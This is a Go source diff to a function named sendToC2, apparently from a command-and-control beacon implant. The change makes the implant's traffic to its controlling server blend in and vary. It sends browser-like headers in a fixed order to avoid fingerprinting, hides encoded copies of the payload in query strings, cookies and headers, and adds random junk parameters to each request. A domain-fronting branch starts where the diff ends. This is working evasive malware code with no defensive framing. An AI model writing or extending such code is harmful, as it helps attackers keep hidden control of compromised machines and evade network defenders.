@@ -1470,28 +1470,73 @@ func sendToC2(idx int, body []byte) []byte {
 	if err != nil {
 		return nil
 	}
+	// Baseline browser-like headers in fixed canonical order so every
+	// beacon emits the identical sequence (map iteration order would be a
+	// per-beacon fingerprint). Profile headers below apply in sorted-key
+	// order and may override any baseline, including Content-Type/UA.
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
-	// Baseline browser-like headers so the beacon blends with ordinary HTTPS
-	// traffic (cover-traffic fidelity). Malleable request headers and any
-	// profile-supplied headers below override these defaults.
 	req.Header.Set("Accept", "application/json, text/plain, */*")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
 	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Set("Connection", "keep-alive")
-	for k, v := range getActiveHeaders() {
-		if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
-			continue
+	if activeHeaders := getActiveHeaders(); len(activeHeaders) > 0 {
+		for _, k := range sortedHeaderKeys(activeHeaders) {
+			req.Header.Set(k, activeHeaders[k])
 		}
-		req.Header.Set(k, v)
 	}
 	// Request-side malleable headers (e.g. Host/Cookie shaping). These are
 	// benign to the server's JSON parsing; they simply ride along on the request.
-	for k, v := range MalleableRequestHeaders {
-		if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
-			continue
+	for _, k := range sortedHeaderKeys(MalleableRequestHeaders) {
+		req.Header.Set(k, MalleableRequestHeaders[k])
+	}
+	// v2 placements: encoded cover copies of the envelope at query / cookie /
+	// header locations. The canonical body is unchanged, so servers without
+	// placement config keep working.
+	if MalleablePlacementStr != "" {
+		if q, cookies, ph := buildPlacementValues(body); q != nil || cookies != nil || ph != nil {
+			if len(q) > 0 {
+				u := req.URL.Query()
+				for k, v := range q {
+					u.Set(k, v)
+				}
+				req.URL.RawQuery = u.Encode()
+			}
+			if len(cookies) > 0 {
+				var sb strings.Builder
+				if prev := req.Header.Get("Cookie"); prev != "" {
+					sb.WriteString(prev)
+					if !strings.HasSuffix(prev, ";") {
+						sb.WriteString("; ")
+					}
+				}
+				i := 0
+				for k, v := range cookies {
+					if i > 0 {
+						sb.WriteString("; ")
+					}
+					sb.WriteString(placementEscape(k))
+					sb.WriteString("=")
+					sb.WriteString(placementEscape(v))
+					i++
+				}
+				req.Header.Set("Cookie", sb.String())
+			}
+			for k, v := range ph {
+				if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
+					continue
+				}
+				req.Header.Set(k, v)
+			}
 		}
-		req.Header.Set(k, v)
+	}
+	// URI jitter: junk query per beacon so identical envelopes still vary on
+	// the wire. Independent of placements; the server ignores unknown params.
+	if JitterURIStr == "true" {
+		u := req.URL.Query()
+		k, v := jitterQueryPair()
+		u.Set(k, v)
+		req.URL.RawQuery = u.Encode()
 	}
 
 	if DomainFront != "" {
